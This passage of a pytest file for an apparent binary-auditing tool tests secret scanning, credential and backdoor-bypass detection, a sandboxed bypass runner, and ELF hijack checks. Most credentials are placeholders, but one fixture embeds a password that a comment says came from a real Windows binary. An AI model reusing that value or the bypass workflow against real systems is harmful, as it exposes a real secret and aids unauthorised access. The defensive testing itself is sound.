    assert fs[0].location == "usado en: sym.check_login"
    assert "sym.check_login" in fs[0].rationale and "no una suposicion" in fs[0].rationale

    # sin xref (r2 no encuentra referencia directa): fallback HONESTO, no inventa una funcion
    fs2 = scan_secrets(make_reg("(no xrefs to 0x00400318)"), "fake", "es")
    assert fs2[0].location == "seccion de datos (.rodata/.data), sin xref directo encontrado"


def test_secrets_xref_falls_back_to_deep_analysis_when_light_analysis_finds_nothing():
    # Bug real encontrado en vivo probando Ingrid.exe: el ToolRegistry usa analisis LIGERO de r2
    # ('aa') por defecto -- una credencial REAL (contrasena en una connection string OLEDB, con un
    # xref real y verificable a mano con 'aaa') salia como "sin xref encontrado" porque el chequeo
    # solo miraba la sesion ligera, nunca reintentaba con mas profundidad. Ahora, si la sesion
    # ligera no encuentra nada y se paso `binary`, se reintenta UNA vez contra la sesion r2
    # compartida (analisis 'aaa' completo) antes de rendirse.
    from unittest.mock import MagicMock, patch
    from binoracle.workflows.secrets import scan_secrets

    reg = MagicMock()
    strings_tool = _mock_tool(data="0 0x1 0x00b20828 20 21 .rodata ascii "
                                    "password=azohc060397\n")
    xrefs_tool = _mock_tool(data="")  # analisis ligero: no encuentra nada (falso negativo)
    reg.get.side_effect = lambda name: {"r2_strings": strings_tool, "r2_xrefs": xrefs_tool}.get(name)

    with patch("binoracle.oracles.r2session.cmd_timeout",
               return_value="fcn.0087c371 0x87c39f [STRN:r--] push str.password") as deep:
        fs = scan_secrets(reg, "/real/path/Ingrid.exe", "es")
    deep.assert_called_once()
    assert deep.call_args[0][0] == "/real/path/Ingrid.exe"
    assert "axt @" in deep.call_args[0][1]
    assert fs[0].location == "usado en: fcn.0087c371"

    # sin `binary` (compatibilidad hacia atras): NO intenta el reintento profundo, se comporta
    # exactamente como antes de este arreglo -- nunca abre una sesion r2 real por sorpresa.
    with patch("binoracle.oracles.r2session.cmd_timeout") as deep2:
        fs2 = scan_secrets(reg, "", "es")
    deep2.assert_not_called()
    assert fs2[0].location == "seccion de datos (.rodata/.data), sin xref directo encontrado"


def test_authcheck_recognizes_win32_comparison_apis_not_just_libc():
    # Bug real encontrado probando con Ingrid.exe (PE real): _CMP solo tenia nombres libc/POSIX
    # (strcmp, memcmp...) -- ningun binario Windows (que usa lstrcmpA/_stricmp/wcscmp, no strcmp)
    # disparaba nunca este chequeo aunque el binario SI comparaba credenciales. Ademas, el chequeo
    # de "sin hashing" tenia un bug preexistente: "evp_" nunca podia hacer match por membership
    # EXACTA contra un import real como "evp_encryptinit" (necesitaba ser prefijo).
    from unittest.mock import MagicMock, patch
    from binoracle.workflows.authcheck import scan_auth

    def make_reg(imports_line):
        reg = MagicMock()
        imports_tool = _mock_tool(data=imports_line)
        strings_tool = _mock_tool(data="0 0x1 0x402000 20 21 .rodata ascii MASTER_PASSWORD_2024\n")
        xrefs_tool = _mock_tool(data="(no xrefs to 0x402000)")
        reg.get.side_effect = lambda name: {
            "r2_imports": imports_tool, "r2_strings": strings_tool, "r2_xrefs": xrefs_tool,
            "r2_disasm": None,
        }.get(name)
        return reg

    # lstrcmpA (Win32) debe disparar el chequeo exactamente igual que strcmp (libc)
    with patch("binoracle.workflows._binfacts.imported_names", return_value={"lstrcmpa"}):
        fs = scan_auth(make_reg(""), "fake.exe", "es")
    assert any("comparacion" in f.title.lower() for f in fs)
    assert any("sin hashing" in f.title.lower() for f in fs)  # ninguna API de hash presente

    # con una API de hash Win32 real presente (prefijo, no nombre exacto): no debe salir el aviso
    # de "sin hashing" -- bug preexistente corregido (antes "evp_" nunca matcheaba nada)
    with patch("binoracle.workflows._binfacts.imported_names",
               return_value={"lstrcmpa", "cryptcreatehash"}):
        fs2 = scan_auth(make_reg(""), "fake.exe", "es")
    assert not any("sin hashing" in f.title.lower() for f in fs2)

    # sin ninguna funcion de comparacion (ni libc ni Win32): no hay nada que reportar
    with patch("binoracle.workflows._binfacts.imported_names", return_value={"printf"}):
        assert scan_auth(make_reg(""), "fake.exe", "es") == []


def test_authcheck_xref_confirmation_distinguishes_verified_link_from_correlation():
    # La mejora principal pedida por el usuario: no basta con que strcmp Y una string sospechosa
    # existan en el binario (correlacion) -- hay que confirmar que la MISMA funcion que hace la
    # comparacion referencia esa credencial concreta (xref real, r2 axt + pdf).
    from unittest.mock import MagicMock, patch
    from binoracle.workflows.authcheck import scan_auth, get_confirmed_credentials

    def make_reg(disasm_body):
        reg = MagicMock()
        imports_tool = _mock_tool(data="1 0x1 GLOBAL FUNC strcmp\n")
        strings_tool = _mock_tool(data="0 0x1 0x402000 20 21 .rodata ascii MASTER_PASSWORD_2024\n")
        xrefs_tool = _mock_tool(data="sym.check_login 0x401177 [STRN:r--] mov edi, str.master")
        disasm_tool = _mock_tool(data=disasm_body)
        reg.get.side_effect = lambda name: {
            "r2_imports": imports_tool, "r2_strings": strings_tool, "r2_xrefs": xrefs_tool,
            "r2_disasm": disasm_tool,
        }.get(name)
        return reg

    with patch("binoracle.workflows._binfacts.imported_names", return_value={"strcmp"}):
        # sym.check_login (que referencia la credencial) TAMBIEN llama a strcmp -> confirmado
        reg_confirmed = make_reg("sym.check_login: push rbp; call sym.imp.strcmp; test eax, eax")
        confirmed = get_confirmed_credentials(reg_confirmed)
        assert confirmed and confirmed[0][1] == "sym.check_login" and confirmed[0][2] == "strcmp"
        fs = scan_auth(reg_confirmed, "fake", "es")
        assert "xref" in fs[0].title.lower()
        assert "CONFIRMADO" in fs[0].rationale

        # sym.check_login SI referencia la credencial (xref real) pero NO llama a ninguna _CMP:
        # tercer estado honesto pedido por el usuario -- no es "sin confirmar" a secas (eso suena
        # a que no se sabe nada), es "hay uso real, pero no es una comparacion" (visto de verdad en
        # Ingrid.exe: una contrasena de BD usada para construir una cadena de conexion OLEDB).
        reg_used_elsewhere = make_reg("sym.check_login: push rbp; call sym.imp.printf; ret")
        assert get_confirmed_credentials(reg_used_elsewhere) == []
        fs2 = scan_auth(reg_used_elsewhere, "fake", "es")
        assert "xref" not in fs2[0].title.lower()
        assert "USO REAL confirmado" in fs2[0].rationale
        assert "sym.check_login" in fs2[0].rationale
        assert "NO llama a ninguna de las comparaciones" in fs2[0].rationale

        # sin NINGUN xref a la credencial (ni siquiera un uso no-comparativo): correlacion pura,
        # el unico caso que sigue diciendo "NO confirmado por xref" a secas.
        reg_no_xref = MagicMock()
        reg_no_xref.get.side_effect = lambda name: {
            "r2_imports": _mock_tool(data="1 0x1 GLOBAL FUNC strcmp\n"),
            "r2_strings": _mock_tool(data="0 0x1 0x402000 20 21 .rodata ascii MASTER_PASSWORD_2024\n"),
            "r2_xrefs": _mock_tool(data=""),
            "r2_disasm": _mock_tool(data=""),
        }.get(name)
        assert get_confirmed_credentials(reg_no_xref) == []
        fs3 = scan_auth(reg_no_xref, "fake", "es")
        assert "xref" not in fs3[0].title.lower()
        assert "NO confirmado por xref" in fs3[0].rationale
        assert "USO REAL" not in fs3[0].rationale


def test_authcheck_confirmation_falls_back_to_deep_analysis_like_secrets():
    # Mismo arreglo que test_secrets_xref_falls_back_to_deep_analysis..., aplicado a la
    # confirmacion de bypass (get_confirmed_credentials): pedido explicito del usuario de que el
    # arreglo cubra "todo, con el bypass y todo", no solo la location de secrets.py -- el bypass
    # en sandbox (authbypass.py) SOLO se intenta si esta funcion confirma un enlace real, asi que
    # el mismo falso negativo por analisis ligero le habria bloqueado la verificacion en sandbox.
    from unittest.mock import MagicMock, patch
    from binoracle.workflows.authcheck import get_confirmed_credentials

    reg = MagicMock()
    imports_tool = _mock_tool(data="1 0x1 GLOBAL FUNC strcmp\n")
    strings_tool = _mock_tool(data="0 0x1 0x402000 20 21 .rodata ascii MASTER_PASSWORD_2024\n")
    xrefs_tool = _mock_tool(data="")   # analisis ligero: sin xref (falso negativo)
    disasm_tool = _mock_tool(data="")  # y sin disasm util tampoco
    reg.get.side_effect = lambda name: {
        "r2_imports": imports_tool, "r2_strings": strings_tool, "r2_xrefs": xrefs_tool,
        "r2_disasm": disasm_tool,
    }.get(name)

    def deep_side_effect(binary, cmd, timeout=60):
        if cmd.startswith("axt @"):
            return "sym.check_login 0x401177 [STRN:r--] mov edi, str.master"
        if cmd.startswith("pdf @"):
            return "sym.check_login: push rbp; call sym.imp.strcmp; test eax, eax"
        return ""

    with patch("binoracle.workflows._binfacts.imported_names", return_value={"strcmp"}), \
         patch("binoracle.oracles.r2session.cmd_timeout", side_effect=deep_side_effect):
        confirmed = get_confirmed_credentials(reg, "/real/path/Ingrid.exe")
    assert confirmed and confirmed[0][1] == "sym.check_login" and confirmed[0][2] == "strcmp"

    # sin `binary`: sin reintento profundo, se comporta como antes (solo analisis ligero)
    with patch("binoracle.workflows._binfacts.imported_names", return_value={"strcmp"}), \
         patch("binoracle.oracles.r2session.cmd_timeout") as deep2:
        assert get_confirmed_credentials(reg, "") == []
    deep2.assert_not_called()


def test_llm_deep_review_recognizes_backdoors_and_magic_flags_not_just_password_compare():
    # Peticion del usuario: no limitar la conexion sandbox a "credencial" en sentido estricto
    # (comparacion de password) -- cubrir CUALQUIER logica de auth/autorizacion bypasseable por una
    # entrada concreta: backdoor con comando magico, flag de debug/dev-mode, comparacion de
    # licencia/serial, etc. La etiqueta nueva 'Entrada de bypass probable'/'Likely bypass input' es
    # generica; la antigua 'Credencial probable'/'Likely credential' se mantiene por compatibilidad
    # y ambas alimentan el mismo atributo credential_candidate (mismo blindaje: grounded o nada).
    from unittest.mock import MagicMock
    from binoracle.workflows.llm_review import llm_deep_review

    class _FakeDecomp:
        func = "sym.main"
        annotated = 'if (strcmp(argv[1], "--debug-unlock-9f2a") == 0) skip_auth();'
        raw = ""

    llm = MagicMock()
    llm.available.return_value = True
    llm.chat.return_value = (
        "### Backdoor por argumento magico\n"
        "Severidad: critical\n"
        "El codigo comprueba si argv[1] es igual a --debug-unlock-9f2a antes de saltarse la "
        "autenticacion, un atajo condicional que ningun scanner de credenciales detectaria.\n"
        "Entrada de bypass probable: --debug-unlock-9f2a")
    fs = llm_deep_review(llm, "fake.elf", {}, {}, [], [_FakeDecomp()], lang="es")
    assert len(fs) == 1
    assert fs[0].severity == "critical"
    assert fs[0].credential_candidate == "--debug-unlock-9f2a"
    assert "atajo condicional" in fs[0].rationale  # la explicacion se conserva, no se pierde

    # sigue funcionando con la etiqueta antigua (compatibilidad hacia atras)
    llm_old = MagicMock()
    llm_old.available.return_value = True
    llm_old.chat.return_value = (
        "### Comparacion de credencial\nSeveridad: high\nCompara con un valor fijo.\n"
        'Credencial probable: --debug-unlock-9f2a')
    fs_old = llm_deep_review(llm_old, "fake.elf", {}, {}, [], [_FakeDecomp()], lang="es")
    assert fs_old[0].credential_candidate == "--debug-unlock-9f2a"


def test_llm_deep_review_extracts_credential_candidate_only_when_grounded_in_context():
    # Siguiente paso pedido explicitamente por el usuario: conectar las sugerencias de la revision
    # LLM con la verificacion dinamica real (authbypass.py) cuando el modelo cita una credencial
    # CONCRETA. Blindaje critico: el valor sugerido solo se acepta si aparece LITERALMENTE en el
    # contexto dado al modelo -- si el modelo alucina un valor que no esta ahi, se descarta (nunca
    # se confia ciegamente en lo que el LLM afirma, ni siquiera para decidir que probar despues).
    from unittest.mock import MagicMock
    from binoracle.workflows.llm_review import llm_deep_review

    class _FakeDecomp:
        func = "sym.check_login"
        annotated = 'if (strcmp(input, "MASTER_PASSWORD_2024") == 0) grant_access();'
        raw = ""

    # el modelo cita un valor que SI esta en el codigo decompilado dado -> se acepta
    llm_real = MagicMock()
    llm_real.available.return_value = True
    llm_real.chat.return_value = (
        "### Comparacion de credencial no cubierta por los scanners\n"
        "Severidad: high\n"
        "El codigo compara la entrada contra MASTER_PASSWORD_2024 usando strcmp.\n"
        "Credencial probable: MASTER_PASSWORD_2024")
    fs = llm_deep_review(llm_real, "fake.elf", {}, {}, [], [_FakeDecomp()], lang="es")
    assert len(fs) == 1
    assert fs[0].credential_candidate == "MASTER_PASSWORD_2024"

    # el modelo alucina un valor que NO aparece en el contexto dado -> se descarta (None), aunque
    # el hallazgo en si (severidad/titulo/explicacion) se mantiene
    llm_fake = MagicMock()
    llm_fake.available.return_value = True
    llm_fake.chat.return_value = (
        "### Comparacion sospechosa\n"
        "Severidad: high\n"
        "Parece que compara contra una clave fija.\n"
        "Credencial probable: TOTALMENTE_INVENTADA_123")
    fs2 = llm_deep_review(llm_fake, "fake.elf", {}, {}, [], [_FakeDecomp()], lang="es")
    assert len(fs2) == 1
    assert fs2[0].credential_candidate is None

    # bloque sin ninguna linea de credencial: atributo presente pero None, sin romper nada
    llm_none = MagicMock()
    llm_none.available.return_value = True
    llm_none.chat.return_value = "### Otro hallazgo\nSeveridad: low\nAlgo no relacionado con auth."
    fs3 = llm_deep_review(llm_none, "fake.elf", {}, {}, [], [_FakeDecomp()], lang="es")
    assert fs3[0].credential_candidate is None


def test_llm_deep_review_parses_new_findings_as_unverified_hypotheses():
    # Peticion explicita del usuario: una revision LLM "sin fronteras" sobre TODO el contexto
    # grounded (mitigaciones, capacidades, hallazgos ya encontrados, codigo decompilado), buscando
    # lo que los scanners ESTATICOS no cubren. Honesto sobre su naturaleza: siempre verdict=
    # "unverified" (hipotesis del modelo, no hecho probado por un oraculo determinista), nunca
    # "grounded"/"verified". Si el modelo no encuentra nada nuevo (responde NADA/NOTHING), no debe
    # inventar un hallazgo solo por rellenar.
    from unittest.mock import MagicMock
    from binoracle.workflows.llm_review import llm_deep_review
    from binoracle.store.session import Finding

    class _FakeDecomp:
        func = "sym.check_license"
        annotated = "if (time(0) > 1700000000) { fail(); }"
        raw = ""

    existing = [Finding(title="Posible credencial", severity="high", verdict="grounded",
                        evidence="x", location="y")]

    llm = MagicMock()
    llm.available.return_value = True
    llm.chat.return_value = (
        "### Verificacion de licencia via comparacion de fecha del sistema\n"
        "Severidad: medium\n"
        "El codigo decompilado compara la fecha del sistema contra una constante fija sin validar "
        "el reloj, lo que permite eludir la verificacion retrocediendo el reloj del sistema.")
    fs = llm_deep_review(llm, "fake.exe", {"Canary": True}, {"red": ["InternetOpenA"]},
                         existing, [_FakeDecomp()], lang="es")
    assert len(fs) == 1
    assert fs[0].verdict == "unverified"  # nunca grounded/verified: es una hipotesis del modelo
    assert fs[0].severity == "medium"
    assert fs[0].title.startswith("[Revision LLM]")
    assert "reloj" in fs[0].rationale

    # el modelo dice que no hay nada nuevo -> no se inventa un hallazgo de relleno
    llm_nothing = MagicMock()
    llm_nothing.available.return_value = True
    llm_nothing.chat.return_value = "NADA"
    assert llm_deep_review(llm_nothing, "fake.exe", {}, {}, existing, [_FakeDecomp()], lang="es") == []

    # sin modelo disponible: no llama al chat, degrada con gracia
    llm_off = MagicMock()
    llm_off.available.return_value = False
    assert llm_deep_review(llm_off, "fake.exe", {"x": 1}, {}, existing, None, lang="es") == []
    assert not llm_off.chat.called

    # sin NADA de contexto (sin mitigaciones/capacidades/hallazgos/decompilado): no llama al modelo,
    # no tiene sentido pedirle que revise un contexto vacio
    llm_empty = MagicMock()
    llm_empty.available.return_value = True
    assert llm_deep_review(llm_empty, "fake.exe", {}, {}, [], None, lang="es") == []
    assert not llm_empty.chat.called


def test_authbypass_detects_real_exit_code_difference_between_credential_and_control(tmp_path):
    # authbypass.py: ejecuta el binario en sandbox con la credencial candidata vs. un control
    # claramente incorrecto, y solo afirma "differs" si el codigo de salida real difiere --
    # nunca interpreta el TEXTO de salida (mas propenso a variar por motivos no relacionados).
    from unittest.mock import patch, MagicMock
    from binoracle.workflows.authbypass import try_credential_bypass

    fake_binary = tmp_path / "target"
    fake_binary.write_bytes(b"\x7fELF")

    def fake_run(cmd, **kwargs):
        # el ultimo argumento de 'bash -c <script>' contiene el contenido de stdin via el volumen;
        # aqui simulamos leyendo el fichero .in que el codigo real escribe antes de invocar docker.
        import os
        # localizar el directorio de trabajo montado (-v <work>:/w)
        work = None
        for i, a in enumerate(cmd):
            if a == "-v":
                work = cmd[i + 1].split(":")[0]
        stdin_bytes = open(os.path.join(work, ".in"), "rb").read()
        if b"MASTER_PASSWORD_2024" in stdin_bytes:
            return MagicMock(stdout="__BO_EXIT__0__\nACCESS GRANTED", stderr="")
        return MagicMock(stdout="__BO_EXIT__1__\nACCESS DENIED", stderr="")

    with patch("shutil.which", return_value="/usr/bin/docker"), \
         patch("subprocess.run") as mock_run:
        # primera llamada: "docker image inspect" (comprobacion de disponibilidad) -> ok
        # siguientes: las dos ejecuciones reales -> fake_run segun el contenido de stdin
        calls = {"n": 0}
        def side_effect(cmd, **kwargs):
            calls["n"] += 1
            if calls["n"] == 1:
                return MagicMock(returncode=0)
            return fake_run(cmd, **kwargs)
        mock_run.side_effect = side_effect
        r = try_credential_bypass(str(fake_binary), "MASTER_PASSWORD_2024")

    assert r.ran is True
    assert r.candidate_exit == 0 and r.control_exit == 1
    assert r.differs is True
    assert "ACCESS GRANTED" in r.candidate_out

    # docker no disponible: degrada con gracia, no lanza excepcion
    with patch("shutil.which", return_value=None):
        r2 = try_credential_bypass(str(fake_binary), "x")
    assert r2.ran is False and "docker no disponible" in r2.note


def test_cfg_blocks_show_inline_notes_and_highlight_verified_addresses():
    # Peticion del usuario viendo el grafo de flujo: cada bloque debe describir bien lo que hace
    # (no solo direccion+asm crudo, hay que pulsarlo para ver la nota), y las partes que forman
    # parte de una cadena VERIFICADA (probada por ejecucion real en sandbox) deben quedar mas
    # detalladas y resaltadas que un bloque generico razonado solo estaticamente.
    from binoracle.report.html import _cfg_html
    from binoracle.workflows.cfg import CFG

    long_note = ("Este bloque LLAMA a gets (funcion sensible): aqui entra o se procesa la entrada, "
                 "un punto clave de la superficie de ataque.")
    cfg = CFG(func="main", nodes=[
        {"id": "b0", "addr": "0x1000", "insns": [{"addr": "0x1000", "txt": "call gets"}],
         "term": "call gets", "note": long_note, "state": ""},
        {"id": "b1", "addr": "0x1020", "insns": [{"addr": "0x1020", "txt": "ret"}],
         "term": "ret", "note": "Fin del bloque: la funcion retorna.", "state": ""},
    ], edges=[{"src": "b0", "dst": "b1", "kind": "jump"}])

    class _Verified:
        verdict = "verified"
        location = "win=0x1000"
        evidence = ""

    class _Grounded:
        verdict = "grounded"
        location = "0x1020"
        evidence = ""

    html = _cfg_html(cfg, "es", findings=[_Verified(), _Grounded()])
    # b0 coincide con el hallazgo VERIFICADO -> resaltado + nota COMPLETA sin truncar
    assert 'class="cfgnode verified"' in html
    assert "VERIFIED" in html
    assert "un punto clave de la superficie de ataque." in html  # nota completa, no cortada con "..."
    # b1 (grounded, no verificado) NO se resalta aunque su direccion tambien aparezca en un hallazgo
    assert html.count('class="cfgnode verified"') == 1

    # sin findings verificados: ningun bloque se resalta, todas las notas van truncadas a 2 lineas
    html_none = _cfg_html(cfg, "es", findings=[_Grounded()])
    assert "verified" not in html_none.replace("cfginfo", "")  # sin contar el id del panel lateral
    assert "..." in html_none  # la nota larga de b0 se trunca sin resaltado


def test_effective_severity_matches_official_cvss_not_the_scanners_fixed_label():
    # Bug real reportado por el usuario viendo el informe: la etiqueta grande HIGH/MEDIUM (severity
    # fijo que asigna cada scanner a mano) se contradecia con el badge CVSS 4.0 del mismo hallazgo
    # -- "HIGH" junto a "CVSS 4.0 5.5" (5.5 es Medium en la escala oficial 0.1-3.9 Low / 4.0-6.9
    # Medium / 7.0-8.9 High / 9.0-10 Critical), y "MEDIUM" junto a "CVSS 4.0 2.9" (Low). La
    # severidad EFECTIVA (usada para el badge, el recuento y el orden) debe ser la OFICIAL que
    # calcula la libreria cvss a partir del score, no el valor fijo del scanner, para no mostrar
    # dos afirmaciones que se contradicen.
    from binoracle.report.html import _effective_severity

    class _Secret:
        title = "Posible credencial en asignacion hardcodeada"
        location = ""
        evidence = ""
        verdict = "grounded"
        severity = "high"  # el scanner secrets.py fija esto a mano

    class _WeakCrypto:
        title = "Criptografia debil o rota (MD5)"
        location = ""
        evidence = ""
        verdict = "grounded"
        severity = "medium"

    assert _effective_severity(_Secret()) == "medium"
    assert _effective_severity(_WeakCrypto()) == "low"

    class _Unclassified:
        # ninguna palabra clave de _RULES en cvss.py -> cvss_for() devuelve None -> se mantiene
        # el severity del scanner tal cual (no hay score oficial con el que contrastar)
        title = "Comportamiento anomalo sin clasificar"
        location = ""
        evidence = ""
        verdict = "grounded"
        severity = "medium"

    assert _effective_severity(_Unclassified()) == "medium"


def test_dark_proof_boxes_never_use_theme_dependent_text_color():
    # Bug real encontrado revisando el informe de Ingrid.exe en el navegador: el texto de estas
    # cajas (fondo SIEMPRE oscuro, #0b0e12-como, independiente del tema claro/oscuro de la pagina)
    # usaba color:var(--fg)/class="mut" sin override -- ambos son variables DEPENDIENTES DEL TEMA
    # (--fg es casi negro #1a2027 en tema claro, el default), asi que el texto salia casi invisible
    # (texto casi negro sobre fondo casi negro). Estas cajas deben usar SIEMPRE un color claro
    # hardcodeado (igual que .proof-t/.proof-ok/.evpre ya hacian antes de esta sesion), nunca
    # var(--fg) ni class="mut" sin override de color inline.
    from binoracle.report.html import (
        _packing_warning_html, _dll_hijack_html, _pdb_leak_html, _rich_header_html,
        _sibling_dll_signing_html, _sandbox_flag_html, _elf_rpath_hijack_html,
        _elf_debug_path_leak_html, _elf_capabilities_html)

    checks = [
        _packing_warning_html({"packer_sections": [("UPX0", "UPX")]}, "es"),
        _dll_hijack_html({"dlls": ["version.dll"]}, "es"),
        _pdb_leak_html({"pdb_path": "C:\\build\\x.pdb"}, "es"),
        _rich_header_html({"present": True, "entries": 5}, "es"),
        _sibling_dll_signing_html({"unsigned_dlls": ["x.dll"], "total": 1}, "es"),
        _sandbox_flag_html({"found": True, "electron": True}, "es"),
        _elf_rpath_hijack_html({"entries": [("DT_RUNPATH", "./lib", "relative")]}, "es"),
        _elf_debug_path_leak_html({"comp_dir": "/home/build", "name": "main.c"}, "es"),
        _elf_capabilities_html({"aware_apis": ["prctl"]}, "es"),
    ]
    for html in checks:
        assert html, "la caja deberia generar contenido para este input de prueba"
        assert "color:var(--fg)" not in html, "texto casi invisible: fondo oscuro fijo + color de tema"
        # cualquier class="mut" dentro de estas cajas debe llevar SIEMPRE un color inline explicito
        for m in __import__("re").finditer(r'class="mut"[^>]*', html):
            assert "color:" in m.group(0), f"class=mut sin override de color en caja oscura: {m.group(0)}"


def test_checks_group_html_bundles_checklist_boxes_into_one_collapsible():
    # Antes cada caja del checklist base (MSI, packing, DLL hijacking, DLL hermana sin firmar,
    # flag de sandbox, fuga de PDB, Rich Header, RPATH/RUNPATH, fuga de ruta DWARF, capacidades
    # Linux) salia siempre abierta, una detras de otra, antes de llegar al resumen ejecutivo --
    # pedido explicito del usuario de organizar mejor el informe con desplegables. Ahora se
    # agrupan en UN solo <details> colapsado con un contador, sin perder ninguna caja individual.
    from binoracle.report.html import _checks_group_html, _dll_hijack_html, _pdb_leak_html

    parts = [
        _dll_hijack_html({"dlls": ["version.dll"]}, "es"),
        _pdb_leak_html({"pdb_path": "C:\\build\\x.pdb"}, "es"),
        "",  # una comprobacion sin contenido no debe romper el conteo ni aparecer vacia
    ]
    out = _checks_group_html(parts, "es")
    assert 'id="sec-checks"' in out
    assert "<details" in out and "</details>" in out
    assert "Comprobaciones adicionales (2)" in out  # cuenta solo las que produjeron contenido
    assert "version.dll" in out and "x.pdb" in out
    # sin ninguna comprobacion, no hay seccion que mostrar
    assert _checks_group_html([], "es") == ""
    assert _checks_group_html(["", ""], "en") == ""


def test_report_orders_summary_and_findings_before_checklist_appendix():
    # El resumen ejecutivo y los hallazgos son lo que se lee primero; las comprobaciones del
    # checklist base (ahora agrupadas) y la metodologia son contenido de apoyo/meta y deben quedar
    # al final, no interponerse antes del resumen como pasaba antes de esta reorganizacion.
    from binoracle.report.html import render_html
    from binoracle.store.session import Finding

    f = Finding(title="fuga de credencial", severity="high", verdict="unverified",
                evidence="ev", location="loc")
    out = render_html("target.bin", findings=[f], lang="es")
    assert out.index('id="sec-summary"') < out.index('id="sec-find"')
    assert out.index('id="sec-find"') < out.index('id="sec-methodology"')


def test_elf_capability_map_classifies_libc_imports_by_category():
    # Equivalente ELF del mapa de capacidades de PE (Fase 2 de la metodologia, aplicada a Linux):
    # clasifica los imports de libc/libcrypto/libpq/etc por categoria. read/write se excluyen a
    # proposito (estan en practicamente todo binario dinamico, diluirian la senal).
    from binoracle.report.html import _elf_capability_map, _capability_html, _ELF_CAPABILITIES

    class _FakeTriage:
        sections = [("Imports", "radare2: ii",
                     "1 0x1 GLOBAL FUNC socket\n"
                     "2 0x2 GLOBAL FUNC connect\n"
                     "3 0x3 GLOBAL FUNC setuid\n"
                     "4 0x4 GLOBAL FUNC execve\n"
                     "5 0x5 GLOBAL FUNC sqlite3_open\n"
                     "6 0x6 GLOBAL FUNC printf\n"
                     "7 0x7 GLOBAL FUNC read\n"
                     "8 0x8 GLOBAL FUNC write\n")]

    cm = _elf_capability_map(_FakeTriage())
    assert cm == {"red": ["connect", "socket"], "proceso": ["execve"],
                  "privilegios": ["setuid"], "bd": ["sqlite3_open"]}
    assert "read" not in str(cm) and "write" not in str(cm)
    html = _capability_html(cm, "es", categories=_ELF_CAPABILITIES)
    assert "Red" in html and "Privilegios" in html and "Bases de datos" in html

    class _EmptyTriage:
        sections = [("Imports", "radare2: ii", "1 0x1 GLOBAL FUNC printf\n")]
    assert _elf_capability_map(_EmptyTriage()) == {}


def test_elf_rpath_hijack_check_flags_relative_and_world_writable_paths(tmp_path):
    # Equivalente ELF de DLL hijacking: DT_RPATH/DT_RUNPATH relativo o en un directorio classic
    # world-writable permite plantar un .so malicioso con el nombre de una dependencia real.
    from unittest.mock import patch, MagicMock
    from binoracle.report.html import _elf_rpath_hijack_check, _elf_rpath_hijack_html

    f = tmp_path / "app"
    f.write_bytes(b"\x7fELF")

    def _mk_dynsec(runpath=None, rpath=None):
        tags = []
        if runpath is not None:
            t = MagicMock(); t.entry.d_tag = "DT_RUNPATH"; t.runpath = runpath
            tags.append(t)
        if rpath is not None:
            t2 = MagicMock(); t2.entry.d_tag = "DT_RPATH"; t2.rpath = rpath
            tags.append(t2)
        dynsec = MagicMock(); dynsec.iter_tags.return_value = tags
        elf = MagicMock(); elf.get_section_by_name.return_value = dynsec
        return elf

    # ruta relativa Y directorio world-writable clasico -> ambas se marcan; ruta absoluta normal no
    with patch("elftools.elf.elffile.ELFFile", return_value=_mk_dynsec(runpath="./lib:/opt/safe/lib:/tmp/evil")):
        res = _elf_rpath_hijack_check(str(f))
    kinds = {(dt, path): kind for dt, path, kind in res["entries"]}
    assert kinds[("DT_RUNPATH", "./lib")] == "relative"
    assert kinds[("DT_RUNPATH", "/tmp/evil")] == "world_writable"
    assert ("DT_RUNPATH", "/opt/safe/lib") not in kinds
    html = _elf_rpath_hijack_html(res, "es")
    assert "./lib" in html and "/tmp/evil" in html and "/opt/safe/lib" not in html

    # DT_RPATH (legado, busqueda antes que LD_LIBRARY_PATH) tambien se detecta y se distingue
    with patch("elftools.elf.elffile.ELFFile", return_value=_mk_dynsec(rpath="lib")):
        res_rpath = _elf_rpath_hijack_check(str(f))
    assert res_rpath["entries"] == [("DT_RPATH", "lib", "relative")]

    # solo rutas absolutas seguras: nada que avisar
    with patch("elftools.elf.elffile.ELFFile", return_value=_mk_dynsec(runpath="/usr/local/lib:/opt/app/lib")):
        assert _elf_rpath_hijack_check(str(f)) == {}
    assert _elf_rpath_hijack_html({}, "es") == ""

    # sin .dynamic (binario estatico): no aplica
    static_elf = MagicMock(); static_elf.get_section_by_name.return_value = None
    with patch("elftools.elf.elffile.ELFFile", return_value=static_elf):
        assert _elf_rpath_hijack_check(str(f)) == {}


def test_elf_debug_path_leak_extracts_dwarf_comp_dir(tmp_path):
    # Equivalente ELF de la fuga de PDB: DW_AT_comp_dir (si se compilo con -g) filtra la ruta
    # absoluta de la maquina de build.
    from unittest.mock import patch, MagicMock
    from binoracle.report.html import _elf_debug_path_leak, _elf_debug_path_leak_html

    f = tmp_path / "app"
    f.write_bytes(b"\x7fELF")

    comp_dir = MagicMock(); comp_dir.value = b"/home/build/agent1/proj/src"
    name = MagicMock(); name.value = b"main.c"
    die = MagicMock(); die.attributes = {"DW_AT_comp_dir": comp_dir, "DW_AT_name": name}
    cu = MagicMock(); cu.get_top_DIE.return_value = die
    dwarf = MagicMock(); dwarf.iter_CUs.return_value = [cu]
    elf = MagicMock(); elf.has_dwarf_info.return_value = True; elf.get_dwarf_info.return_value = dwarf

    with patch("elftools.elf.elffile.ELFFile", return_value=elf):
        res = _elf_debug_path_leak(str(f))
    assert res == {"comp_dir": "/home/build/agent1/proj/src", "name": "main.c"}
    html = _elf_debug_path_leak_html(res, "es")
    assert "/home/build/agent1/proj/src" in html and "main.c" in html

    # sin DWARF (release limpio, sin -g): nada que avisar
    elf_clean = MagicMock(); elf_clean.has_dwarf_info.return_value = False
    with patch("elftools.elf.elffile.ELFFile", return_value=elf_clean):
        assert _elf_debug_path_leak(str(f)) == {}
    assert _elf_debug_path_leak_html({}, "es") == ""


def test_elf_capabilities_check_detects_aware_apis_and_xattr(tmp_path):
    # Checklist "Linux capabilities": dos senales distintas, ninguna adivinada. (1) el binario
    # importa APIs de manejo de capabilities (capset/prctl) -- hecho de codigo. (2) la xattr
    # security.capability esta asignada -- hecho del fichero, solo legible en Linux/si sobrevivio
    # la transferencia; NO se decodifica el bitmask exacto (mismo principio de honestidad que MSI).
    from unittest.mock import patch
    from binoracle.report.html import _elf_capabilities_check, _elf_capabilities_html

    f = tmp_path / "app"
    f.write_bytes(b"\x7fELF")

    class _FakeTriage:
        sections = [("Imports", "radare2: ii", "1 0x1 GLOBAL FUNC prctl\n2 0x2 GLOBAL FUNC capset\n")]

    res = _elf_capabilities_check(str(f), _FakeTriage())
    assert res == {"aware_apis": ["capset", "prctl"]}
    html = _elf_capabilities_html(res, "es")
